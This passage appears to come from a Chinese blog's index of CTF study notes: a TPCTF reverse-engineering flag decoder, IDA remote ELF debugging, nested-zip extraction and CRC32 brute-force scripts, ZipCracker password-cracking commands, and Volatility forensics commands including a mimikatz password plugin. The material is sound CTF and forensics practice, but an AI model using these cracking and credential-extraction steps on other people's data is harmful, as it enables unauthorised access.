class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import binascii<br><br>data = <span class="hljs-string">&quot;34282500262C21270030340ED200262F3200392F35002933000112A4000118302C2139D12ED93DD6202DD3333D00019ABDADAD6D000103B9ADAD6E000103B9ADAD6E0001030D01030001100001000F0F0F0F0F1C2C3C0F1222320F1424340F1132300F1C2C3C0F0927380F1121310F1132300F1121310F0727380F1323330F1132300F1525350F0527380F1323330F1132300F1929390F0B27380F1727370F1132300F1626360F0727380F1828380F0F29300F0F26300F0F24300F0F213000FF490008FF4A0000074B0008074C008000FF4D0108FF4E0100074F01080750018000FF4D0208FF4E0200074F02080750028000FF4D0308FF4E0300074F03080750038077F488F499F4AAF4B0E717F4E1E827F4ACEA37F4C8EC37F448EF37F49BF217F4280044280044280044280044204F10205010205110FF2C2536252C1A000027252D331A0000000F000000002C293625331A000304037A7B7C7D7C7D7E7F80819A9B867B8788898A8B8C8D7D807D909192939495967F94959C9500000000000058E5ADE40BE7FEE48D1C038E1D038D23038E240388B9FFFF8D2D0388B9FFFF8D2C038C2F0320FFFFA0FFD0E860000000000000&quot;</span><br><br>data = binascii<span class="hljs-selector-class">.a2b_hex</span>(data)<br><br><span class="hljs-selector-tag">table</span> = &#123;&#125;<br>str_1 = <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;A&quot;</span>)<br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>x21,<span class="hljs-number">0</span>x3B):<br>    <span class="hljs-selector-tag">table</span><span class="hljs-selector-attr">[i]</span> = <span class="hljs-built_in">chr</span>(str_1)<br>    str_1 += <span class="hljs-number">1</span><br><span class="hljs-selector-tag">table</span><span class="hljs-selector-attr">[0x20]</span> = <span class="hljs-string">&quot;@&quot;</span><br><span class="hljs-selector-tag">table</span><span class="hljs-selector-attr">[0]</span> = <span class="hljs-string">&quot; &quot;</span><br><span class="hljs-selector-tag">table</span><span class="hljs-selector-attr">[0x3d]</span> = <span class="hljs-string">&quot;_&quot;</span><br>str_1 = <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;0&quot;</span>)<br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>xD0,<span class="hljs-number">0</span>xDA):<br>    <span class="hljs-selector-tag">table</span><span class="hljs-selector-attr">[i]</span> = <span class="hljs-built_in">chr</span>(str_1)<br>    str_1 += <span class="hljs-number">1</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>    <span class="hljs-keyword">for</span> key,value <span class="hljs-keyword">in</span> <span class="hljs-selector-tag">table</span><span class="hljs-selector-class">.items</span>():<br>        <span class="hljs-keyword">if</span> data<span class="hljs-selector-attr">[i]</span> == key:<br>            flag += value<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(flag)</span></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741710467489-0446e5ee-e3bc-4afd-a9bc-27269875e8eb.png"></p><p>THE FLAG PT2 FOR YOU IS PLAY1N9_6@M3S_ LBRDTRPLGXAQRPAQGXCSRPEUGXCSRPIYGXGWRPFVGXHXIPFPDPAP GWWWH H H H @@@LEVEL GEMS LIVES CDMLO@0</p><h3 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h3><p>看ppu viewer</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1741708666856-c2b8147d-30a2-4fe3-91ba-9775a25f2426.png"></p><p>ON_Y0UR_N3S?}</p><p>FLAG：TPCTF{D0_Y0U_L1KE_PLAY1N9_6@M3S_ ON_Y0UR_N3S?}</p>]]></content>
    
    
    
    <tags>
      
      <tag>REVERSE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IDA调试ELF文件</title>
    <link href="/2025/03/22/IDA%E8%B0%83%E8%AF%95ELF%E6%96%87%E4%BB%B6/"/>
    <url>/2025/03/22/IDA%E8%B0%83%E8%AF%95ELF%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.52pojie.cn/thread-730499-1-1.html">ida动态调试elf(无坑详细) - 吾爱破解 - 52pojie.cn</a></p><p>1.把ida中dbgsrv目录下的linux_server或者linux_serverx64放到linux中（根据自己要调试的程序选择哪个版本的）</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1731551950474-b9f09d50-6ba1-4729-8d70-4d266ad1980d.png"></p><table><thead><tr><th></th></tr></thead><tbody><tr><td>2.chmod a+x linux_serverx64改变属性，然后运行 linux_serverx64</td></tr></tbody></table><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1731552001791-c5f90157-f1ff-476d-a9eb-dfc7f1f2731d.png"></p><ol start="3"><li>首先选择Romote Linux debugger，然后在process option中设置相关相关参数</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1731552020880-9ce10238-54d1-4238-b560-e0685b914807.png"></p><p>这里要注意<br>**很多失败的原因都是因为这个参数没设置好<br>****很多失败的原因都是因为这个参数没设置好<br>**<strong>很多失败的原因都是因为这个参数没设置好</strong>  </p><p>重要的事说三遍，Application和Input file的路径为linux中要调试程序的路径，包括程序，  </p><p>比如这里&#x2F;home&#x2F;lql&#x2F;mywork&#x2F;other是调试程序存放的路径，WxyVM1是我们要调试的程序名，Directory设置为存放路径就可以了<br>第二个地方，hostname要设置为linux的ip地址，一开始我设置成localhost一直报错，说目标机器积极拒绝······<br>端口号默认即可，密码你没有特意设置也默认为空，上面的那个Parameters空着就好</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1731552042826-9d9196c4-896a-4c8c-92b0-1dd34c6dcbd4.png"></p><ol start="4"><li>到这一步可以说是快成功了，首先在ida中下断点，然后点start process，程序运行，在linux中就可以看到程序启动了（注意这里不是attach process，选择attach process会报错时候程序是在终端运行或者你没有权限）<br><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1731552059084-a3466cc0-acfd-4400-a74c-addc90658142.png"></li></ol><p>5.就是调试过程了</p>]]></content>
    
    
    
    <tags>
      
      <tag>REVERSE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>zip套娃，明文攻击</title>
    <link href="/2025/03/22/%E7%88%86%E7%A0%B4%E5%AF%86%E9%92%A53/"/>
    <url>/2025/03/22/%E7%88%86%E7%A0%B4%E5%AF%86%E9%92%A53/</url>
    
    <content type="html"><![CDATA[<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># 初始设置：压缩包存储目录和初始zip文件名称</span><br><span class="hljs-string">&quot;&quot;&quot;只要修改路径和需要解压的压缩包即可&quot;&quot;&quot;</span><br>zip_directory = <span class="hljs-string">r&#x27;D:\网站下载\taowa&#x27;</span><br>zip_name = <span class="hljs-string">&#x27;999.zip&#x27;</span><br><br><span class="hljs-comment"># 循环解压嵌套的压缩包</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># 拼接当前的完整压缩包路径</span><br>    zip_path = os.path.join(zip_directory, zip_name)<br><br>    <span class="hljs-comment"># 打开当前压缩包</span><br>    <span class="hljs-keyword">with</span> zipfile.ZipFile(zip_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> myzip:<br>        <span class="hljs-comment"># 获取压缩包内文件列表</span><br>        file_list = myzip.namelist()<br><br>        <span class="hljs-comment"># 判断是否有zip文件，提取文件名</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">any</span>(<span class="hljs-string">&#x27;.zip&#x27;</span> <span class="hljs-keyword">in</span> f <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> file_list):  <span class="hljs-comment"># 如果文件列表中没有zip文件</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Final unzipped location: <span class="hljs-subst">&#123;zip_path&#125;</span>&quot;</span>)<br>            <span class="hljs-comment"># 解压到目标目录</span><br>            myzip.extractall(os.path.join(zip_directory, <span class="hljs-string">&#x27;final&#x27;</span>))<br>            <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 终止循环</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 如果文件列表中有zip文件，提取其中第一个zip文件</span><br>            <span class="hljs-keyword">for</span> file_name <span class="hljs-keyword">in</span> file_list:<br>                <span class="hljs-keyword">if</span> file_name.endswith(<span class="hljs-string">&#x27;.zip&#x27;</span>):<br>                    zip_name = file_name  <span class="hljs-comment"># 更新zip_name为内部的zip文件</span><br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-comment"># 解压当前的zip包到同级目录</span><br>            myzip.extractall(zip_directory)<br></code></pre></td></tr></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="解不完的压缩包"><a href="#解不完的压缩包" class="headerlink" title="解不完的压缩包"></a>解不完的压缩包</h2><h3 id="这里附上爆破脚本（使用时记得修改初始设置）"><a href="#这里附上爆破脚本（使用时记得修改初始设置）" class="headerlink" title="这里附上爆破脚本（使用时记得修改初始设置）"></a>这里附上爆破脚本（使用时记得修改初始设置）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># 初始设置：压缩包存储目录和初始zip文件名称</span><br><span class="hljs-string">&quot;&quot;&quot;只要修改路径和需要解压的压缩包即可&quot;&quot;&quot;</span><br>zip_directory = <span class="hljs-string">r&#x27;D:\网站下载\taowa&#x27;</span><br>zip_name = <span class="hljs-string">&#x27;999.zip&#x27;</span><br><br><span class="hljs-comment"># 循环解压嵌套的压缩包</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># 拼接当前的完整压缩包路径</span><br>    zip_path = os.path.join(zip_directory, zip_name)<br><br>    <span class="hljs-comment"># 打开当前压缩包</span><br>    <span class="hljs-keyword">with</span> zipfile.ZipFile(zip_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> myzip:<br>        <span class="hljs-comment"># 获取压缩包内文件列表</span><br>        file_list = myzip.namelist()<br><br>        <span class="hljs-comment"># 判断是否有zip文件，提取文件名</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">any</span>(<span class="hljs-string">&#x27;.zip&#x27;</span> <span class="hljs-keyword">in</span> f <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> file_list):  <span class="hljs-comment"># 如果文件列表中没有zip文件</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Final unzipped location: <span class="hljs-subst">&#123;zip_path&#125;</span>&quot;</span>)<br>            <span class="hljs-comment"># 解压到目标目录</span><br>            myzip.extractall(os.path.join(zip_directory, <span class="hljs-string">&#x27;final&#x27;</span>))<br>            <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 终止循环</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 如果文件列表中有zip文件，提取其中第一个zip文件</span><br>            <span class="hljs-keyword">for</span> file_name <span class="hljs-keyword">in</span> file_list:<br>                <span class="hljs-keyword">if</span> file_name.endswith(<span class="hljs-string">&#x27;.zip&#x27;</span>):<br>                    zip_name = file_name  <span class="hljs-comment"># 更新zip_name为内部的zip文件</span><br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-comment"># 解压当前的zip包到同级目录</span><br>            myzip.extractall(zip_directory)<br></code></pre></td></tr></table></figure><p>拿到1.zip</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1727162769582-eb127e25-d6a5-46ac-b6e8-6133526e930f.png"></p><p>发现解压要密码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1727162838854-3e32704b-17d0-4f2a-a939-e926b2803165.png"></p><p>crcexp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> crc32<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> zipfile<br><br>dic = string.printable<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">CrackCrc</span>(<span class="hljs-params">crc</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:<br>        <span class="hljs-comment"># print (i)</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:<br>            s = i + j<br>            <span class="hljs-comment"># print (crc32(bytes(s,&#x27;ascii&#x27;)) &amp; 0xffffffff)</span><br>            <span class="hljs-keyword">if</span> crc == (crc32(<span class="hljs-built_in">bytes</span>(s, <span class="hljs-string">&#x27;ascii&#x27;</span>)) &amp; <span class="hljs-number">0xffffffff</span>):<br>                <span class="hljs-built_in">print</span>(s)<br>                <span class="hljs-keyword">return</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getcrc32</span>(<span class="hljs-params">fname</span>):<br>    l = []<br>    file = fname<br>    f = zipfile.ZipFile(file, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    <span class="hljs-keyword">global</span> fileList<br>    fileList = f.namelist()<br>    <span class="hljs-built_in">print</span>(fileList)<br>    <span class="hljs-comment"># print (type(fileList))</span><br>    <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> fileList:<br>        Fileinfo = f.getinfo(filename)<br>        <span class="hljs-comment"># print(Fileinfo)</span><br>        crc = Fileinfo.CRC<br>        <span class="hljs-comment"># print (&#x27;crc&#x27;,crc)</span><br>        l.append(crc)<br>    <span class="hljs-keyword">return</span> l<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">filename=<span class="hljs-literal">None</span></span>):<br>    l = getcrc32(filename)<br>    <span class="hljs-comment"># print(l)</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(l)):<br>        <span class="hljs-built_in">print</span>(fileList[i], end=<span class="hljs-string">&#x27;的内容是:&#x27;</span>)<br>        CrackCrc(l[i])<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main(<span class="hljs-string">&#x27;cccccccrc.zip&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1727164516506-a5ae1627-40bb-4b70-83b6-683929ea5824.png"></p><p>密码*m:#P7j0</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1727164624552-ae97851f-33a5-426e-a268-1cd29be4b1d5.png">使用winrar进行压缩解压，用bandzip可能导致压缩后的文件大小不一样</p><h1 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h1><p>会报错，不能攻击<img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1730951752697-0df9f019-2684-433b-810a-f6e017dce816.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>zipcracker，crc</title>
    <link href="/2025/03/22/%E7%88%86%E7%A0%B4%E5%AF%86%E9%92%A52/"/>
    <url>/2025/03/22/%E7%88%86%E7%A0%B4%E5%AF%86%E9%92%A52/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/asaotomo/article/details/132005223">Zip伪加密破解神器——ZipCracker-CSDN博客</a></p><h1 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h1><h5 id="1-伪加密识别及修复"><a href="#1-伪加密识别及修复" class="headerlink" title="1.伪加密识别及修复"></a>1.伪加密识别及修复</h5><p>python ZipCracker.py test01.zip</p><h5 id="2-暴力破解-内置字典"><a href="#2-暴力破解-内置字典" class="headerlink" title="2.暴力破解-内置字典"></a>2.暴力破解-内置字典</h5><p>python ZipCracker.py test02.zip</p><h5 id="3-暴力破解-用户自定义字典"><a href="#3-暴力破解-用户自定义字典" class="headerlink" title="3.暴力破解-用户自定义字典"></a>3.暴力破解-用户自定义字典</h5><p>python ZipCracker.py test02.zip MyDict.txt</p><h1 id="crc"><a href="#crc" class="headerlink" title="crc"></a>crc</h1><p><a href="https://github.com/theonlypwner/crc32">theonlypwner&#x2F;crc32: CRC32 tools: reverse, undo&#x2F;rewind, and calculate hashes (github.com)</a></p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> crc32<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> zipfile<br><br>dic = string.printable<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">CrackCrc</span>(<span class="hljs-params">crc</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:<br>        <span class="hljs-comment"># print (i)</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:<br>            s = i + j<br>            <span class="hljs-comment"># print (crc32(bytes(s,&#x27;ascii&#x27;)) &amp; 0xffffffff)</span><br>            <span class="hljs-keyword">if</span> crc == (crc32(<span class="hljs-built_in">bytes</span>(s, <span class="hljs-string">&#x27;ascii&#x27;</span>)) &amp; <span class="hljs-number">0xffffffff</span>):<br>                <span class="hljs-built_in">print</span>(s)<br>                <span class="hljs-keyword">return</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getcrc32</span>(<span class="hljs-params">fname</span>):<br>    l = []<br>    file = fname<br>    f = zipfile.ZipFile(file, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    <span class="hljs-keyword">global</span> fileList<br>    fileList = f.namelist()<br>    <span class="hljs-built_in">print</span>(fileList)<br>    <span class="hljs-comment"># print (type(fileList))</span><br>    <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> fileList:<br>        Fileinfo = f.getinfo(filename)<br>        <span class="hljs-comment"># print(Fileinfo)</span><br>        crc = Fileinfo.CRC<br>        <span class="hljs-comment"># print (&#x27;crc&#x27;,crc)</span><br>        l.append(crc)<br>    <span class="hljs-keyword">return</span> l<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">filename=<span class="hljs-literal">None</span></span>):<br>    l = getcrc32(filename)<br>    <span class="hljs-comment"># print(l)</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(l)):<br>        <span class="hljs-built_in">print</span>(fileList[i], end=<span class="hljs-string">&#x27;的内容是:&#x27;</span>)<br>        CrackCrc(l[i])<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main(<span class="hljs-string">&#x27;cccccccrc.zip&#x27;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2025/03/22/logo%E8%AF%AD%E8%A8%80/"/>
    <url>/2025/03/22/logo%E8%AF%AD%E8%A8%80/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.calormen.com/jslogo/">https://www.calormen.com/jslogo/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>内存取证</title>
    <link href="/2025/03/22/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/"/>
    <url>/2025/03/22/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<h1 id="volatility"><a href="#volatility" class="headerlink" title="volatility"></a>volatility</h1><p><a href="https://blog.csdn.net/m0_68012373/article/details/127419463">https://blog.csdn.net/m0_68012373&#x2F;article&#x2F;details&#x2F;127419463</a></p><p><a href="https://blog.csdn.net/zjjcxy_long/article/details/108315214">https://blog.csdn.net/zjjcxy_long&#x2F;article&#x2F;details&#x2F;108315214</a></p><h2 id="vol2"><a href="#vol2" class="headerlink" title="vol2"></a>vol2</h2><p>与python对应</p><p><a href="https://github.com/volatilityfoundation/volatility.git">https://github.com/volatilityfoundation/volatility.git</a></p><ol><li>git clone之后cd volatility</li><li>sudo python2 setup.py install</li><li>pip2 install pycryptodome</li><li>pip2 install distorm3</li></ol><p>vol.py -f 1.raw imageinfo#获取镜像详细信息</p><p>vol.py -f 1.raw –profile&#x3D;Win7SP1x64 pslist#查看进程</p><p>vol.py -f 1.raw –profile&#x3D;Win7SP1x64 psscan#查看进程且能检测到隐藏或者解链的进程</p><p>#提取进程</p><p>vol.py -f 1.raw –profile&#x3D;Win7SP1x64 memdump -n iexplore.exe -D .&#x2F;#导出为dmp</p><p>vol.py -f 1.vmem –profile&#x3D;Win7SP1x64 procdump -n iexplore.exe -D .&#x2F;#导出为exe</p><p>vol.py -f 1.vmem –profile&#x3D;Win7SP1x64 dlldump -n iexplore.exe -D .&#x2F;#将进程的所有dll导出</p><p>vol.py -f 1.vmem –profile&#x3D;Win7SP1x64 dumpregistry -D .&#x2F;#提取注册表数据</p><p>vol.py –plugins volatility&#x2F;plugins&#x2F; -f 1.raw –profile&#x3D;Win7SP1x64 mimikatz#获取密码，也可能是clipboard</p><p>vol.py -f 1.vmem –profile&#x3D;Win7SP1x64 iehistory#查看浏览器历史记录</p><p>vol.py -f 1.raw –profile&#x3D;Win7SP0x64 dumpfiles -Q 0x000000001e742dd0 -D .&#x2F;#根据编号提取文件</p><p>vol.py -f 1.raw –profile&#x3D;Win7SP1x64 envars | grep ‘FLAG’#查看环境变量</p><p>vol.py -f 1.raw –profile&#x3D;Win7SP1x64 hivelist#查看当前内存中装载的注册表</p><p>vol.py -f 1.raw –profile&#x3D;Win7SP1x64 hivedump -o 0xfffff8a00148a420 #dump某个内存地址中的注册表</p><p>cat mem.vmem | strings | grep “flag”#查找字符串flag</p><h1 id="磁盘取证"><a href="#磁盘取证" class="headerlink" title="磁盘取证"></a>磁盘取证</h1>]]></content>
    
    
    
    <tags>
      
      <tag>取证</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>30种加密</title>
    <link href="/2025/03/22/30%E5%8A%A0%E5%AF%86/"/>
    <url>/2025/03/22/30%E5%8A%A0%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://cloud.tencent.com/developer/article/1748394">30余种加密编码类型的密文特征分析（建议收藏）-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>路径变量</title>
    <link href="/2025/03/22/linux%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"/>
    <url>/2025/03/22/linux%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<p>export PATH&#x3D;”$HOME&#x2F;.local&#x2F;bin:$PATH”</p>]]></content>
    
    
    
    <tags>
      
      <tag>linxu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux虚拟机</title>
    <link href="/2025/03/22/linux/"/>
    <url>/2025/03/22/linux/</url>
    
    <content type="html"><![CDATA[<h1 id="创建虚拟环境"><a href="#创建虚拟环境" class="headerlink" title="创建虚拟环境"></a>创建虚拟环境</h1><p>python3 -m venv myenv</p><h1 id="激活虚拟环境-Linux-或-macOS"><a href="#激活虚拟环境-Linux-或-macOS" class="headerlink" title="激活虚拟环境 (Linux 或 macOS)"></a>激活虚拟环境 (Linux 或 macOS)</h1><p>source myenv&#x2F;bin&#x2F;activate</p><h1 id="激活虚拟环境-Windows"><a href="#激活虚拟环境-Windows" class="headerlink" title="激活虚拟环境 (Windows)"></a>激活虚拟环境 (Windows)</h1><p>myenv\Scripts\activate</p><h1 id="在虚拟环境中安装所需的包"><a href="#在虚拟环境中安装所需的包" class="headerlink" title="在虚拟环境中安装所需的包"></a>在虚拟环境中安装所需的包</h1><p>pip install <package-name></p><h1 id="完成后可以退出虚拟环境"><a href="#完成后可以退出虚拟环境" class="headerlink" title="完成后可以退出虚拟环境"></a>完成后可以退出虚拟环境</h1><p>deactivate</p><h1 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h1><p><a href="https://blog.csdn.net/weixin_62808713/article/details/130372239?ops_request_misc=%257B%2522request%255Fid%2522%253A%252275710E19-7DEF-4E5D-8742-DC68FA9F949F%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=75710E19-7DEF-4E5D-8742-DC68FA9F949F&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-130372239-null-null.142%5Ev100%5Epc_search_result_base6&utm_term=kali%E6%8D%A2%E6%BA%90&spm=1018.2226.3001.4187">Kali 更换源（超详细，附国内优质镜像源地址）_kali换源-CSDN博客</a></p><p>vim &#x2F;etc&#x2F;apt&#x2F;sources.list</p><p>中科大Kali镜像源</p><p>deb <a href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p><p>deb-src <a href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p><p>阿里云Kali镜像源</p><p>deb <a href="http://mirrors.aliyun.com/kali">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free 